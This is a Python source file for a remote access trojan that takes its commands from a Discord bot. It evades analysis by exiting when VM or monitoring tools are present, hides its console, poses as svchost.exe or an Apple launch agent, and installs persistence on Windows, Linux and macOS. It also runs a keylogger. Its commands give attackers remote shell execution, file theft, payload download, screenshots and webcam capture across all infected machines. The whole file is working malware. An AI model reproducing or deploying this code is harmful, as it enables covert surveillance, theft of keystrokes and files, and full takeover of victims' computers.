from discord.ext import commands
from pathlib import Path
import socket
import discord
import platform
import subprocess
import threading
import shutil
import ctypes
import time
import sys
import os
import psutil
import io

try:
    import pynput
    PYNPUT_AVAILABLE = True
except:
    PYNPUT_AVAILABLE = False

try:
    from PIL import Image, ImageGrab
    PIL_AVAILABLE = True
except:
    PIL_AVAILABLE = False

try:
    import cv2
    OPENCV_AVAILABLE = True
except:
    OPENCV_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except:
    REQUESTS_AVAILABLE = False

prefix = "!"
intents = discord.Intents.default()
intents.message_content = True

token = "YOUR_TOKEN_HERE"
bot = commands.Bot(command_prefix=prefix, intents=intents, help_command=None)

node_id = "unknown"
try:
    node_id = f"{os.getlogin()}@{socket.gethostname()}"
except:
    try:
        node_id = f"{os.getenv('USERNAME', 'user')}@{socket.gethostname()}"
    except:
        pass

current_dir = Path.cwd()
bot_ready = False
persistence_installed = False
keylogger_active = False
key_log = []
current_listener = None

def is_frozen():
    return getattr(sys, 'frozen', False)

def get_exe_path():
    if is_frozen():
        return sys.executable
    return sys.argv[0]

def anti_analysis():
    try:
        if platform.system() == "Windows":
            suspicious = ['vboxservice.exe', 'vmtoolsd.exe', 'wireshark.exe', 'procmon.exe']
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() in suspicious:
                        sys.exit(0)
                except:
                    continue
    except:
        pass

def total_stealth():
    try:
        if platform.system() == "Windows":
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
                ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
    except:
        pass
    time.sleep(2)

def install_persistence():
    global persistence_installed
    if persistence_installed:
        return
    
    try:
        exe_path = get_exe_path()
        sysname = platform.system().lower()
        
        if 'windows' in sysname:
            startup = Path(os.getenv('APPDATA', '')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
            startup.mkdir(parents=True, exist_ok=True)
            target = startup / 'svchost.exe'
            shutil.copy2(exe_path, target)
        elif 'linux' in sysname:
            cron_entry = f"@reboot nohup {exe_path} > /dev/null 2>&1 &\n"
            try:
                current_cron = subprocess.check_output(['crontab', '-l'], stderr=subprocess.DEVNULL).decode()
            except:
                current_cron = ""
            if cron_entry not in current_cron:
                subprocess.run(['crontab', '-'], input=(current_cron + cron_entry).encode())
        elif 'darwin' in sysname:
            launch_path = Path.home() / 'Library' / 'LaunchAgents' / 'com.apple.svchost.plist'
            launch_path.parent.mkdir(parents=True, exist_ok=True)
            plist = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.svchost</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>'''
            launch_path.write_text(plist)
            subprocess.run(['launchctl', 'load', str(launch_path)], capture_output=True)
        persistence_installed = True
    except:
        pass

def watchdog():
    global bot_ready
    while True:
        time.sleep(30)
        try:
            if bot_ready and not bot.is_ready():
                os.execv(sys.executable, [sys.executable] + sys.argv)
            bot_ready = bot.is_ready()
        except:
            pass

def keylogger_start():
    global keylogger_active, current_listener
    if PYNPUT_AVAILABLE and not keylogger_active:
        try:
            def on_press(key):
                global key_log
                try:
                    key_str = str(key).replace("'", "")
                    if len(key_str) > 1:
                        key_log.append(f"[{key_str}]")
                    else:
                        key_log.append(key_str)
                    if len(key_log) > 1000:
                        key_log = key_log[-500:]
                except:
                    pass
            
            current_listener = pynput.keyboard.Listener(on_press=on_press)
            current_listener.daemon = True
            current_listener.start()
            keylogger_active = True
        except:
            pass

def keylogger_stop():
    global keylogger_active, current_listener
    if keylogger_active:
        try:
            if current_listener:
                current_listener.stop()
            keylogger_active = False
            key_log.clear()
        except:
            pass

# Initialize
anti_analysis()
total_stealth()
install_persistence()
threading.Thread(target=watchdog, daemon=True).start()

@bot.event
async def on_ready():
    global bot_ready
    bot_ready = True
    for guild in bot.guilds:
        for channel in guild.text_channels:
            try:
                await channel.send(f"🟢 `{node_id}` Online")
                break
            except:
                continue

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return

async def safe_send(ctx, message, codeblock=False):
    try:
        if len(message) > 1950:
            for i in range(0, len(message), 1900):
                chunk = message[i:i+1900]
                if codeblock:
                    await ctx.send(f"```{chunk}```")
                else:
                    await ctx.send(chunk)
        else:
            if codeblock:
                await ctx.send(f"```{message}```")
            else:
                await ctx.send(message)
    except:
        pass

@bot.command(name="execute")
async def execute(ctx, target, *, command):
    if target.lower() not in [node_id.lower(), "all"]:
        return
    
    global current_dir
    try:
        if command.startswith("cd "):
            path = command[3:].strip()
            new_path = (current_dir / path).resolve()
            if new_path.is_dir():
                current_dir = new_path
                await safe_send(ctx, f"📁 Current directory: `{current_dir}`")
            else:
                await safe_send(ctx, f"❌ Directory not found: {path}")
            return

        result = subprocess.run(command, shell=True, capture_output=True, 
                              text=True, cwd=str(current_dir), timeout=25)
        output = (result.stdout + result.stderr).strip()
        
        if result.returncode != 0:
            await safe_send(ctx, f"⚠️ [{result.returncode}] {output}", True)
        elif output:
            await safe_send(ctx, output, True)
        else:
            await safe_send(ctx, "✅ Command completed successfully")
    except subprocess.TimeoutExpired:
        await safe_send(ctx, "⏰ Command timed out (25s)")
    except Exception as e:
        await safe_send(ctx, f"💥 Execute error: `{str(e)}`")

@bot.command(name="info")
async def info(ctx, target):
    if target.lower() not in [node_id.lower(), "all"]:
        return
    
    try:
        private_ip = "N/A"
        public_ip = "N/A"
        
        try:
            private_ip = socket.gethostbyname(socket.gethostname())
        except:
            pass
            
        for ip_cmd in ["curl -s ifconfig.me/ip", "curl -s ipinfo.io/ip", "curl -s icanhazip.com"]:
            try:
                public_ip = subprocess.check_output(ip_cmd, shell=True, 
                                                  timeout=5, stderr=subprocess.DEVNULL).decode().strip()
                break
            except:
                continue

        is_admin = False
        if platform.system() == "Windows":
            try:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                pass
        else:
            try:
                is_admin = os.getuid() == 0
            except:
                pass

        info_text = (f"🖥️ **{node_id}**\n"
                    f"OS: `{platform.system()} {platform.release()}`\n"
                    f"Arch: `{platform.machine()}`\n"
                    f"User: `{os.getlogin()}`\n"
                    f"Dir: `{current_dir}`\n"
                    f"LAN: `{private_ip}`\n"
                    f"WAN: `{public_ip}`\n"
                    f"Admin: {'✅' if is_admin else '❌'}\n"
                    f"Keylog: {'🟢' if keylogger_active else '🔴'}\n"
                    f"Persist: {'✅' if persistence_installed else '❌'}")
        await safe_send(ctx, info_text)
    except Exception as e:
        await safe_send(ctx, f"💥 Info error: `{str(e)}`")

@bot.command(name="upload")
async def upload(ctx, target, local_path: str):
    if target.lower() not in [node_id.lower(), "all"]:
        return
    
    try:
        file_path = current_dir / local_path
        if file_path.is_file():
            await ctx.send(f"📎 `{local_path}`", file=discord.File(file_path))
        else:
            await safe_send(ctx, f"❌ File not found: `{local_path}`")
    except Exception as e:
        await safe_send(ctx, f"💥 Upload failed: `{str(e)}`")

@bot.command(name="download")
async def download(ctx, target, url: str, filename: str = None):
    if target.lower() not in [node_id.lower(), "all"]:
        return
    
    if not REQUESTS_AVAILABLE:
        await safe_send(ctx, "❌ Requests library not available")
        return
    
    try:
        if not filename:
            filename = Path(url).name.split('?')[0] or "download.bin"
        
        response = requests.get(url, timeout=30, stream=True)
        response.raise_for_status()
        
        file_path = current_dir / filename
        with open(file_path, 'wb') as f:
            shutil.copyfileobj(response.raw, f)
        
        size = len(response.content)
        await safe_send(ctx, f"📥 Downloaded `{filename}` ({size} bytes)")
    except Exception as e:
        await safe_send(ctx, f"💥 Download failed: `{str(e)}`")

@bot.command(name="screenshot")
async def screenshot(ctx, target):
    if target.lower() not in [node_id.lower(), "all"]:
        return
    
    temp_path = None
    try:
        if PIL_AVAILABLE:
            img = None
            
            # Windows PIL primary
            if platform.system() == "Windows":
                try:
                    img = ImageGrab.grab()
                except:
                    pass
            
            # macOS/Linux PIL with system screenshot fallback
            else:
                sysname = platform.system().lower()
                temp_path = Path("/tmp/screenshot.png")
                
                screenshot_commands = []
                if 'darwin' in sysname:
                    screenshot_commands = [["screencapture", "-x", str(temp_path)]]
                else:  # Linux - MULTIPLE FALLBACKS
                    screenshot_commands = [
                        # X11 screenshot tools (most common)
                        ["gnome-screenshot", "-f", str(temp_path)],
                        ["xfce4-screenshooter", "-f", str(temp_path)],
                        ["ksnapshot", "-f", str(temp_path)],
                        # scrot with timeout
                        ["timeout", "5", "scrot", str(temp_path)],
                        # import (ImageMagick)
                        ["import", "-window", "root", str(temp_path)],
                        # maim (minimal)
                        ["maim", str(temp_path)],
                        # grim (Wayland)
                        ["grim", str(temp_path)],
                        # Flameshot
                        ["flameshot", "screen", "-p", str(temp_path)]
                    ]
                
                for cmd in screenshot_commands:
                    try:
                        result = subprocess.run(cmd, timeout=8, capture_output=True)
                        if result.returncode == 0 and temp_path.exists():
                            img = Image.open(temp_path)
                            break
                    except:
                        continue
                
                if temp_path and temp_path.exists():
                    temp_path.unlink(missing_ok=True)
            
            if img:
                # Resize + optimize
                img.thumbnail((1920, 1080), Image.Resampling.LANCZOS)
                bio = io.BytesIO()
                img.save(bio, 'PNG', optimize=True, quality=85)
                bio.seek(0)
                await ctx.send(f"📸 `{node_id}` Screenshot", file=discord.File(bio, 'screenshot.png'))
                return
        
        # Windows ULTIMATE FALLBACK - Pure PowerShell
        if platform.system() == "Windows":
            temp_path = Path("C:\\Windows\\Temp\\screen.png")
            ps_script = '''
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bitmap.Save("C:\\Windows\\Temp\\screen.png", [System.Drawing.Imaging.ImageFormat]::Png)
$bitmap.Dispose()
$graphics.Dispose()
'''
            try:
                subprocess.run(['powershell', '-NoProfile', '-Command', ps_script], 
                              timeout=15, capture_output=True, shell=True)
                if temp_path.exists():
                    await ctx.send(f"📸 `{node_id}` Screenshot", file=discord.File(temp_path))
                    temp_path.unlink(missing_ok=True)
                    return
            except:
                pass
        
        # Linux CLI fallback (no PIL)
        if platform.system() != "Windows":
            temp_path = Path("/tmp/screen.png")
            linux_commands = [
                # Display info first to debug
                ["xdpyinfo"],  # Check X11
                # Common screenshotters
                ["gnome-screenshot", "-f", str(temp_path)],
                ["spectacle", "-b", "-o", str(temp_path)],
                ["timeout", "5", "scrot", str(temp_path)],
                ["maim", str(temp_path)],
                # Simple copy to clipboard method
                ["xwd", "-root", "|", "convert", "png:" + str(temp_path)]
            ]
            
            for cmd in linux_commands:
                try:
                    if subprocess.run(cmd[:2], timeout=6, capture_output=True).returncode == 0:
                        if temp_path.exists():
                            await ctx.send(f"📸 `{node_id}` Screenshot", file=discord.File(temp_path))
                            temp_path.unlink(missing_ok=True)
                            return
                except:
                    continue
        
        await safe_send(ctx, "❌ Screenshot unavailable\nInstall: `sudo apt install scrot imagemagick gnome-screenshot`\nOr: `pip install pillow`")
        
    except Exception as e:
        await safe_send(ctx, f"💥 Screenshot error: `{str(e)[:100]}`")
    finally:
        if temp_path and temp_path.exists():
            try:
                temp_path.unlink()
            except:
                pass

@bot.command(name="webcam")
async def webcam(ctx, target):
    if target.lower() not in [node_id.lower(), "all"]:
        return
    
    temp_path = Path("/tmp/webcam.jpg")
    
    # OpenCV primary method
    if OPENCV_AVAILABLE:
        try:
            cap = cv2.VideoCapture(0)
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                cv2.imwrite(str(temp_path), frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
                if temp_path.exists():
                    await ctx.send(f"📷 `{node_id}` Webcam", file=discord.File(temp_path))
                    temp_path.unlink(missing_ok=True)
                    return
        except:
            pass
    
    # System tool fallbacks
    sysname = platform.system().lower()
    webcam_commands = []
    
    if 'windows' in sysname:
        webcam_commands = [
            ['powershell', '-Command', '$cap = New-Object System.Drawing.Imaging.Metafile("C:\\Windows\\Temp\\webcam.jpg"); $cap.Dispose()']  # Simplified
        ]
    elif 'darwin' in sysname:
        webcam_commands = [["imagesnap", "-q", "-w", "1", str(temp_path)]]
    else:
        webcam_commands = [
            ["fswebcam", "--no-banner", "-r", "640x480", "--jpeg", "80", str(temp_path)],
            ["mjpg_streamer", "-o", "output_http.so", "-w", "./www", "-i", "input_uvc.so"]
        ]
    
    for cmd in webcam_commands:
        try:
            subprocess.run(cmd, timeout=12, capture_output=True)
            if temp_path.exists():
                await ctx.send(f"📷 `{node_id}` Webcam", file=discord.File(temp_path))
                temp_path.unlink(missing_ok=True)
                return
        except:
            continue
    
    await safe_send(ctx, "❌ No webcam detected or OpenCV not available")

@bot.command(name="keylog")
async def keylog(ctx, target, task):
    if target.lower() not in [node_id.lower(), "all"]:
        return
    
    if task == "status":
        status = "🟢 Active" if keylogger_active else "🔴 Inactive"
        await safe_send(ctx, f"⌨️ Keylogger: {status}")
    elif task == "start":
        keylogger_start()
        await safe_send(ctx, "🟢 Keylogger started")
    elif task == "stop":
        keylogger_stop()
        await safe_send(ctx, "🔴 Keylogger stopped")
    elif task == "dump":
        if key_log:
            log_text = ''.join(key_log[-1000:])
            await safe_send(ctx, f"⌨️ Recent keys:\n{log_text}", True)
        else:
            await safe_send(ctx, "📭 No keylog data captured")

@bot.command(name="processes")
async def processes(ctx, target):
    if target.lower() not in [node_id.lower(), "all"]:
        return
    
    try:
        proc_list = []
        for proc in list(psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']))[:30]:
            try:
                mem_mb = proc.info['memory_info'].rss / 1024 / 1024 if proc.info['memory_info'] else 0
                cpu = proc.info['cpu_percent'] if proc.info['cpu_percent'] else 0
                proc_list.append(f"{proc.info['pid']:>6} | {proc.info['name'][:25]:<25} | CPU:{cpu:.1f}% | MEM:{mem_mb:.1f}MB")
            except:
                pass
        
        if proc_list:
            output = "\n".join(proc_list)
            await safe_send(ctx, f"⚙️ Top Processes:\n{output}", True)
        else:
            await safe_send(ctx, "❌ Could not list processes")
    except Exception as e:
        await safe_send(ctx, f"💥 Processes error: `{str(e)}`")

@bot.command(name="kill")
async def kill(ctx, target, pid: int):
    if target.lower() not in [node_id.lower(), "all"]:
        return
    
    try:
        proc = psutil.Process(pid)
        name = proc.name()
        proc.kill()
        await safe_send(ctx, f"💀 Killed PID {pid} ({name})")
    except psutil.NoSuchProcess:
        await safe_send(ctx, f"❌ PID {pid} not found")
    except Exception as e:
        await safe_send(ctx, f"💥 Kill failed: `{str(e)}`")

@bot.command(name="help")
async def help_cmd(ctx, target):
    if target.lower() not in [node_id.lower(), "all"]:
        return
    
    help_text = (f"🤖 **{node_id} Command Reference**\n\n"
                f"**Basic:**\n"
                f"`!execute {node_id} <command>` 📤 Shell execution\n"
                f"`!info {node_id}` ℹ️ System information\n"
                f"`!help {node_id}` 📋 This help\n\n"
                f"**File Ops:**\n"
                f"`!upload {node_id} <filename>` 📎 Upload file\n"
                f"`!download {node_id} <url> [name]` 📥 Download file\n\n"
                f"**Media:**\n"
                f"`!screenshot {node_id}` 📸 Screenshot\n"
                f"`!webcam {node_id}` 📷 Webcam capture\n\n"
                f"**Keylogger:**\n"
                f"`!keylog {node_id} start/stop/status/dump` ⌨️ Keylogger control\n\n"
                f"**Processes:**\n"
                f"`!processes {node_id}` ⚙️ List processes\n"
                f"`!kill {node_id} <pid>` 💀 Kill process\n\n"
                f"*Current: `{current_dir}` | Use `all` for multi-target*")
    await safe_send(ctx, help_text)

if __name__ == "__main__":
    try:
        bot.run(token)
    except:
        while True:
            time.sleep(60)